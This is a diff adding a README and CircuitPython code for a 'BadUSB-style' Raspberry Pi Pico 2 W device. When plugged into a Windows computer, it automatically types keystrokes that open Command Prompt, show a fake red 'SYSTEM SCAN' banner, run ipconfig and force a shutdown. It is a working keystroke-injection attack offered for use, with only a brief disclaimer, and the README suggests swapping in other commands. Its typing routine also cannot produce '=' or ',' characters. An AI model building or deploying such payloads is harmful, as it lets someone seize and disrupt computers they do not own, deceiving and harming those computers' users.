@@ -1,0 +1,155 @@
+# Pico 2 W HID Payload Demo
+
+A simple USB HID (BadUSB-style) project for the **Raspberry Pi Pico 2 W** using CircuitPython.
+
+When plugged into a Windows computer, the device:
+1. Opens the Run dialog
+2. Launches Command Prompt
+3. Changes the text color to red
+4. Displays a "SYSTEM SCAN" message
+5. Runs `ipconfig /all`
+6. Immediately shuts down the computer
+
+---
+
+## ⚠️ Disclaimer
+
+This project is for **educational purposes and authorized testing only**.  
+Do **not** use it on any system you do not own or do not have explicit permission to test.
+
+---
+
+## Requirements
+
+- Raspberry Pi Pico 2 W
+- CircuitPython 10.x
+- `adafruit_hid` library
+
+---
+
+## Installation
+
+1. Flash CircuitPython for the Pico 2 W from [circuitpython.org](https://circuitpython.org/board/raspberry_pi_pico2_w/)
+2. Download the CircuitPython library bundle and copy the `adafruit_hid` folder into the `lib` folder on the CIRCUITPY drive
+3. Copy `code.py` to the root of the CIRCUITPY drive
+4. Safely eject the drive and plug the Pico into a Windows computer
+
+The payload will run automatically after a few seconds.
+
+---
+
+## Notes
+
+- The initial 5-second delay gives Windows time to recognize the device as a keyboard.
+- You can change the final command if you want a different action (restart, logoff, etc.).
+
+
+
+
+
+
+
+
+
+
+
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keycode import Keycode
+
+kbd = Keyboard(usb_hid.devices)
+
+def press(*keys):
+    kbd.press(*keys)
+    time.sleep(0.05)
+    kbd.release_all()
+    time.sleep(0.05)
+
+def type_string(text):
+    for char in text:
+        if char == " ":
+            press(Keycode.SPACE)
+        elif char == "/":
+            press(Keycode.FORWARD_SLASH)
+        elif char == "-":
+            press(Keycode.MINUS)
+        elif char == ".":
+            press(Keycode.PERIOD)
+        elif char == "0":
+            press(Keycode.ZERO)
+        elif char == "1":
+            press(Keycode.ONE)
+        elif char == "2":
+            press(Keycode.TWO)
+        elif char == "3":
+            press(Keycode.THREE)
+        elif char == "4":
+            press(Keycode.FOUR)
+        elif char == "5":
+            press(Keycode.FIVE)
+        elif char == "6":
+            press(Keycode.SIX)
+        elif char == "7":
+            press(Keycode.SEVEN)
+        elif char == "8":
+            press(Keycode.EIGHT)
+        elif char == "9":
+            press(Keycode.NINE)
+        elif char.isupper():
+            press(Keycode.SHIFT, getattr(Keycode, char))
+        elif char.islower():
+            press(getattr(Keycode, char.upper()))
+        time.sleep(0.03)
+
+# ========== PAYLOAD ==========
+
+time.sleep(5)  # Wait for the host to recognize the keyboard
+
+# Open Run dialog
+press(Keycode.GUI, Keycode.R)
+time.sleep(0.8)
+
+# Launch Command Prompt
+type_string("cmd")
+press(Keycode.ENTER)
+time.sleep(1.5)
+
+# Set text color to red
+type_string("color c")
+press(Keycode.ENTER)
+time.sleep(0.4)
+
+# Cool header
+type_string("echo ========================================")
+press(Keycode.ENTER)
+type_string("echo   SYSTEM SCAN INITIATED...")
+press(Keycode.ENTER)
+type_string("echo ========================================")
+press(Keycode.ENTER)
+time.sleep(0.7)
+
+# Run a basic network command
+type_string("ipconfig /all")
+press(Keycode.ENTER)
+time.sleep(2.5)
+
+type_string("echo.")
+press(Keycode.ENTER)
+type_string("echo Scan complete. Shutting down NOW...")
+press(Keycode.ENTER)
+time.sleep(1)
+
+# Immediate shutdown
+type_string("shutdown /s")
+press(Keycode.ENTER)
+
+
+
+
+
+
+
+
+
+
